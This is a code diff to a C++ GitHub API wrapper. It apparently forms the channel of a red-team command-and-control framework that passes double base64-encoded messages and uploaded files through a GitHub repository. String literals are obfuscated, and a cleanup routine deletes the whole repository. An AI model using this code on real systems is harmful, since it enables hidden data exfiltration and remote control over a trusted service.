@@ -3,7 +3,9 @@
 #include "Common/FSecure/CppTools/StringConversions.h"
 #include "Common/FSecure/WinHttp/HttpClient.h"
 #include "Common/FSecure/Crypto/Base64.h"
+#include "Common/FSecure/CppTools/Utils.h"
 #include <fstream>
+
 
 using namespace FSecure::StringConversions;
 using namespace FSecure::WinHttp;
@@ -13,6 +15,7 @@ namespace {
 		return Convert<Utf16>(str);
 	}
 }
+
 
 FSecure::GithubApi::GithubApi(std::string const& token, std::string const& channelName, std::string const& userAgent) {
 	if (auto winProxy = WinTools::GetProxyConfiguration(); !winProxy.empty())
@@ -65,6 +68,7 @@ std::map<std::string, std::int64_t> FSecure::GithubApi::ListChannels() {
 
 		channelMap.insert({ channelName, cId });
 	}
+
 	return channelMap;
 }
 
@@ -90,15 +94,45 @@ std::string FSecure::GithubApi::CreateChannel(std::string const& channelName) {
 			throw std::runtime_error(OBF("Throwing exception: unable to create channel - ") + errorMsg);
 		}
 	}
+
 	return channelName;
 }
 
-FSecure::ByteVector FSecure::GithubApi::ReadFile(std::string const& filename) {
-	std::string url = OBF("https://api.github.com/repos/") + this->m_Username + OBF("/") + this->m_Channel 
-						+ OBF("/contents/") + filename;
+FSecure::ByteVector FSecure::GithubApi::ReadFile(std::string const& fileNameSizeSHA) {
+	std::string url;
+	json response;
+	std::string delimiter = OBF(":");
 
-	ByteVector content = SendHttpRequest(url, OBF("application/vnd.github.v3.raw"), Method::GET, true);
+	//string contains filename:size:sha value
+	std::vector<std::string> fileNameSizeSHASplit = Utils::SplitAndCopy(fileNameSizeSHA, delimiter);
+	
+	std::int64_t fileSize = 0;
+	std::string filename;
+	std::string fileSHA;
 
+
+	if (fileNameSizeSHASplit.size() > 0) {
+		filename = fileNameSizeSHASplit.at(0);
+		fileSize = std::stoull(fileNameSizeSHASplit.at(1), NULL ,10);
+		fileSHA = fileNameSizeSHASplit.at(2);
+	}
+	else {
+		throw std::runtime_error(OBF("Throwing exception: cant parse fileNameSizeSHA\n"));
+	}
+	
+	// Github does not allow API access to download raw file with size of > 1 MB
+	// less than or equal to 1 MB for Github API, otherwise Github Blob to retrieve the file
+	if (fileSize <= 1048576) {
+		url = OBF("https://api.github.com/repos/") + this->m_Username + OBF("/") + this->m_Channel
+			+ OBF("/contents/") + filename;
+	}
+	else {
+		url = OBF("https://api.github.com/repos/") + this->m_Username + OBF("/") + this->m_Channel
+			+ OBF("/git/blobs/") + fileSHA;
+	}
+ 
+	auto content = cppcodec::base64_rfc4648::decode(SendHttpRequest(url, OBF("application/vnd.github.v3.raw"), Method::GET, true));
+	
 	return content;
 }
 
@@ -122,12 +156,14 @@ void FSecure::GithubApi::WriteMessageToFile(std::string const& direction, ByteVi
 
 	j[OBF("message")] = OBF("Initial Commit");
 	j[OBF("branch")] = OBF("master");
-	j[OBF("content")] = cppcodec::base64_rfc4648::encode(data);
+	j[OBF("content")] = cppcodec::base64_rfc4648::encode(cppcodec::base64_rfc4648::encode(data));
 
 	json response = SendJsonRequest(url, j, Method::PUT);
 }
 
 void FSecure::GithubApi::UploadFile(std::string const& path) {
+	std::cout << "UPLOAD FILE ... " << std::flush;
+
 	std::filesystem::path filepathForUpload = path;
 	auto readFile = std::ifstream(filepathForUpload, std::ios::binary);
 
@@ -139,63 +175,64 @@ void FSecure::GithubApi::UploadFile(std::string const& path) {
 	std::string filename = OBF("upload-") + FSecure::Utils::GenerateRandomString(10) + OBF("-") + ts + OBF("-") + fn;
 
 	WriteMessageToFile("", packet, filename);
+
+	std::cout << "UPLOAD FILE OK" << std::endl;
 }
 
-void FSecure::GithubApi::DeleteFile(std::string const& filename) {
+void FSecure::GithubApi::DeleteFile(std::string const& fileNameSizeSHA) {
+	std::string url;
 	json j;
 	json response;
 
-	std::string getFileInfoUrl = OBF("https://api.github.com/repos/") + this->m_Username + OBF("/") + this->m_Channel
-		+ OBF("/contents/") + filename;
+	std::string delimiter = OBF(":");
+	std::string fileSHA;
 
-	response = json::parse(SendHttpRequest(getFileInfoUrl, OBF("*/*"), Method::GET, true));
+	std::vector<std::string> fileNameSizeSHASplit = Utils::SplitAndCopy(fileNameSizeSHA, delimiter);
 
-	if (!response.contains(OBF("sha"))) {
-		throw std::runtime_error(OBF("Throwing exception: file does not exist - "));
+	std::int64_t fileSize;
+	std::string filename;
+
+	if (fileNameSizeSHASplit.size() > 0) {
+		filename = fileNameSizeSHASplit.at(0);
+		fileSize = std::stoull(fileNameSizeSHASplit.at(1), NULL, 10);
+		fileSHA = fileNameSizeSHASplit.at(2);
+	}
+	else {
+		throw std::runtime_error(OBF("Throwing exception: cant parse fileNameSizeSHA\n"));
 	}
 
-	std::string delFileUrl = OBF("https://api.github.com/repos/") + this->m_Username + OBF("/") + this->m_Channel
+	url = OBF("https://api.github.com/repos/") + this->m_Username + OBF("/") + this->m_Channel
 		+ OBF("/contents/") + filename;
 
 	j[OBF("message")] = OBF("Initial Commit");
-	j[OBF("sha")] = response[OBF("sha")];
+	j[OBF("sha")] = fileSHA;
 
-	response = SendJsonRequest(delFileUrl, j, Method::DEL);
+	response = SendJsonRequest(url, j, Method::DEL);
 }
 
 void FSecure::GithubApi::DeleteAllFiles() {
 	std::string url;
-	std::string filename;
-	json j;
 	json response;
 
-	std::string getAllFileInfoUrl = OBF("https://api.github.com/repos/") + this->m_Username + OBF("/") + 
-						this->m_Channel + OBF("/contents/");
+	//delete repo
+	url = OBF("https://api.github.com/repos/") + this->m_Username + OBF("/") +
+		this->m_Channel;
 
-	std::string baseUrl = OBF("https://api.github.com/repos/") + this->m_Username + OBF("/") + this->m_Channel
-		+ OBF("/contents/");
-	
-	response = json::parse(SendHttpRequest(getAllFileInfoUrl, OBF("*/*"), Method::GET, true));
+	response = SendJsonRequest(url, NULL, Method::DEL);
 
 	if (response.contains(OBF("message"))) {
-		throw std::runtime_error(OBF("Throwing exception: repository is empty\n"));
-	}
-		
-	j[OBF("message")] = OBF("Initial Commit");
-
-	for (auto& file : response) {
-		j[OBF("sha")] = file[OBF("sha")];
-		filename = file[OBF("name")];
-		url = baseUrl + filename;
-
-		SendJsonRequest(url , j, Method::DEL);
+		throw std::runtime_error(OBF("Throwing exception: unable to delete repository\n"));
 	}
 }
 
 std::map<std::string, std::string> FSecure::GithubApi::GetMessagesByDirection(std::string const& direction) {
 	std::map<std::string, std::string> messages;
 	json response;
+	std::string filename;
 	std::size_t found;
+	std::int64_t fileSize;
+	std::string fileSizeStr;
+	std::string fileSHA;
 	
 	std::string url = OBF("https://api.github.com/repos/") + this->m_Username + OBF("/") +
 						this->m_Channel + OBF("/contents");
@@ -204,17 +241,22 @@ std::map<std::string, std::string> FSecure::GithubApi::GetMessagesByDirection(st
 
 	for (auto& match : response) {
 		if (match.contains(OBF("name"))) {
-			std::string filename = match[OBF("name")];
+			filename = match[OBF("name")];
+			fileSize = match[OBF("size")];
+			fileSHA = match[OBF("sha")];
+
+			fileSizeStr = std::to_string(fileSize);
 
 			//Search whether filename contains direction id
 			found = filename.find(direction);
 
 			if (found != std::string::npos) {
 				std::string ts = filename.substr(filename.length() - 10); // 10 = epoch time length
-				messages.insert({ ts, filename });
+				messages.insert({ts, filename + OBF(":") + fileSizeStr + OBF(":") + fileSHA });
 			}
 		}
 	}
+
 	return messages;
 }
 
